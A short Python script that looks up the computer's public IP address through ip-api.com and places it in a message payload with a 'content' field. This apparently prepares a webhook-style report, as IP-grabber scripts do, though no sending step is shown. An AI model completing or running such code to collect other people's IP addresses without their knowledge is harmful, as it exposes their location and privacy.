import requests

# Get the global IP address of the computer
def get_global_ip():
    response = requests.get('http://ip-api.com/json')
    if response.status_code == 200:
        data = response.json()
        return data.get('query')
    return None

ip_address = get_global_ip()

payload = {
    "content": f"IP: {ip_address}"
}